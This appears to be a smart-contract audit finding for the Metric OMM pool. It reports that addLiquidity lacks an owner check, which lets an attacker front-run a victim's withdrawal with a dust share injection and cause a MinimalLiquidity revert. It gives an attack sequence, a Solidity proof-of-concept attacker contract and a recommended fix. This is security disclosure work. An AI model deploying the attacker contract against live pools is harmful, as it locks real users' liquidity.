### Title
Unprivileged `addLiquidity` Caller Can Grief Any LP Position via `minimalMintableLiquidity` DoS — (`metric-core/contracts/MetricOmmPool.sol`)

### Summary

`addLiquidity` accepts an arbitrary `owner` address with no `msg.sender == owner` guard, while `removeLiquidity` enforces `msg.sender == owner`. Any caller that implements `IMetricOmmModifyLiquidityCallback` can inject shares into a victim's position. Combined with the `minimalMintableLiquidity` floor enforced inside `removeLiquidity`, this lets an attacker permanently block a victim's attempt to withdraw a specific share count, breaking the liquidity-removal flow.

### Finding Description

`removeLiquidity` correctly restricts callers:

```solidity
// MetricOmmPool.sol line 206
if (msg.sender != owner) revert NotPositionOwner();
```

`addLiquidity` has no equivalent guard:

```solidity
// MetricOmmPool.sol lines 182-196
function addLiquidity(
    address owner,          // ← arbitrary; never checked against msg.sender
    uint80 salt,
    LiquidityDelta calldata deltas,
    bytes calldata callbackData,
    bytes calldata extensionData
) external nonReentrant(PoolActions.ADD_LIQUIDITY) ...
```

Inside `LiquidityLib.addLiquidity`, the position key is derived from the supplied `owner`, not from `msg.sender`:

```solidity
// LiquidityLib.sol line 72
bytes32 posKey = _positionBinKey(owner, salt, int8(binIdx));
```

The callback is fired on `msg.sender` (attacker pays), but shares are credited to `owner` (victim receives). After the injection, `removeLiquidity` enforces:

```solidity
// LiquidityLib.sol lines 200-202
if (newUserShares > 0 && newUserShares < ctx.minimalMintableLiquidity) {
    revert IMetricOmmPoolActions.MinimalLiquidity(newUserShares, ctx.minimalMintableLiquidity);
}
```

Attack sequence:
1. Victim (a router/vault contract) holds exactly `X` shares in bin `b` and calls `removeLiquidity(victim, salt, [{bin: b, shares: X}])` to fully exit.
2. Attacker front-runs with `addLiquidity(victim, salt, [{bin: b, shares: 1}])`, paying 1-wei-equivalent tokens.
3. Victim now holds `X + 1` shares. Their `removeLiquidity` removes `X`, leaving `1`.
4. `1 < MINIMAL_MINTABLE_LIQUIDITY` → `MinimalLiquidity` revert. Victim's exit transaction fails.
5. Attacker repeats on every retry, permanently blocking the victim's hardcoded withdrawal path.

### Impact Explanation

Any smart-contract LP (router, vault, aggregator) that computes the share count to withdraw off-chain or in a prior transaction and then submits a fixed-amount `removeLiquidity` call is permanently DoS-able. The victim's liquidity is locked in the pool; they cannot exit via their normal code path. This breaks the core liquidity-removal flow and constitutes unusable withdraw functionality per the allowed impact gate.

### Likelihood Explanation

- The attacker only needs to implement `IMetricOmmModifyLiquidityCallback` (trivial) and hold a dust amount of the pool's tokens.
- Front-running is straightforward on any EVM chain with a public mempool.
- The cost per attack round is near-zero (1 wei of scaled token value).
- Any protocol that integrates Metric OMM liquidity management via a contract is exposed.

### Recommendation

Add the same ownership guard to `addLiquidity` that already exists in `removeLiquidity`:

```solidity
function addLiquidity(
    address owner,
    ...
) external nonReentrant(PoolActions.ADD_LIQUIDITY) ... {
+   if (msg.sender != owner) revert NotPositionOwner();
    ...
}
```

If "deposit on behalf of" is a desired feature, introduce an explicit allowance mapping (`approvedDepositor[owner][depositor]`) so the owner opts in, rather than allowing any caller to inject shares unconditionally.

### Proof of Concept

```solidity
// Attacker contract
contract Attacker is IMetricOmmModifyLiquidityCallback {
    IMetricOmmPool pool;
    IERC20 token0;
    IERC20 token1;

    function metricOmmModifyLiquidityCallback(
        uint256 amount0, uint256 amount1, bytes calldata
    ) external {
        if (amount0 > 0) token0.transfer(msg.sender, amount0);
        if (amount1 > 0) token1.transfer(msg.sender, amount1);
    }

    // Call this in the same block as victim's removeLiquidity, before it lands
    function grief(address victim, uint80 salt, int256 binIdx) external {
        int256[] memory bins = new int256[](1);
        uint256[] memory shares = new uint256[](1);
        bins[0] = binIdx;
        shares[0] = 1; // dust injection
        LiquidityDelta memory delta = LiquidityDelta({binIdxs: bins, shares: shares});
        // owner = victim; msg.sender = attacker (pays via callback)
        pool.addLiquidity(victim, salt, delta, "", "");
        // victim now has originalShares + 1; their fixed-amount removeLiquidity reverts
        // with MinimalLiquidity if 1 < MINIMAL_MINTABLE_LIQUIDITY
    }
}
``` [1](#0-0) [2](#0-1) [3](#0-2) [4](#0-3) [5](#0-4)

### Citations

**File:** metric-core/contracts/MetricOmmPool.sol (L182-196)
```text
  function addLiquidity(
    address owner,
    uint80 salt,
    LiquidityDelta calldata deltas,
    bytes calldata callbackData,
    bytes calldata extensionData
  ) external nonReentrant(PoolActions.ADD_LIQUIDITY) returns (uint256 amount0Added, uint256 amount1Added) {
    if (deltas.binIdxs.length == 0) return (0, 0);
    if (deltas.binIdxs.length != deltas.shares.length) revert LiquidityDeltaLengthMismatch();
    _beforeAddLiquidity(msg.sender, owner, salt, deltas, extensionData);
    (amount0Added, amount1Added) = LiquidityLib.addLiquidity(
      _liquidityContext(), owner, salt, deltas, callbackData, binTotals, _binStates, _binTotalShares, _positionBinShares
    );
    _afterAddLiquidity(msg.sender, owner, salt, deltas, amount0Added, amount1Added, extensionData);
  }
```

**File:** metric-core/contracts/MetricOmmPool.sol (L199-212)
```text
  function removeLiquidity(address owner, uint80 salt, LiquidityDelta calldata deltas, bytes calldata extensionData)
    external
    nonReentrant(PoolActions.REMOVE_LIQUIDITY)
    returns (uint256 amount0Removed, uint256 amount1Removed)
  {
    if (deltas.binIdxs.length == 0) return (0, 0);
    if (deltas.binIdxs.length != deltas.shares.length) revert LiquidityDeltaLengthMismatch();
    if (msg.sender != owner) revert NotPositionOwner();
    _beforeRemoveLiquidity(msg.sender, owner, salt, deltas, extensionData);
    (amount0Removed, amount1Removed) = LiquidityLib.removeLiquidity(
      _liquidityContext(), owner, salt, deltas, binTotals, _binStates, _binTotalShares, _positionBinShares
    );
    _afterRemoveLiquidity(msg.sender, owner, salt, deltas, amount0Removed, amount1Removed, extensionData);
  }
```

**File:** metric-core/contracts/libraries/LiquidityLib.sol (L70-72)
```text
          // safe because -128 <= LOWEST_BIN <= HIGHEST_BIN <= 127 (enforced by factory)
          // forge-lint: disable-next-line(unsafe-typecast)
          bytes32 posKey = _positionBinKey(owner, salt, int8(binIdx));
```

**File:** metric-core/contracts/libraries/LiquidityLib.sol (L144-155)
```text
      if (amount0Added > 0 || amount1Added > 0) {
        uint256 balance0Before = IERC20(ctx.token0).balanceOf(address(this));
        uint256 balance1Before = IERC20(ctx.token1).balanceOf(address(this));
        IMetricOmmModifyLiquidityCallback(msg.sender)
          .metricOmmModifyLiquidityCallback(amount0Added, amount1Added, callbackData);
        if (amount0Added > 0 && balance0Before + amount0Added > IERC20(ctx.token0).balanceOf(address(this))) {
          revert IMetricOmmPoolActions.InsufficientTokenBalance();
        }
        if (amount1Added > 0 && balance1Before + amount1Added > IERC20(ctx.token1).balanceOf(address(this))) {
          revert IMetricOmmPoolActions.InsufficientTokenBalance();
        }
      }
```

**File:** metric-core/contracts/libraries/LiquidityLib.sol (L196-202)
```text
          if (userShares < sharesToRemove) {
            revert IMetricOmmPoolActions.InsufficientLiquidity(sharesToRemove, userShares);
          }
          uint256 newUserShares = userShares - sharesToRemove;
          if (newUserShares > 0 && newUserShares < ctx.minimalMintableLiquidity) {
            revert IMetricOmmPoolActions.MinimalLiquidity(newUserShares, ctx.minimalMintableLiquidity);
          }
```
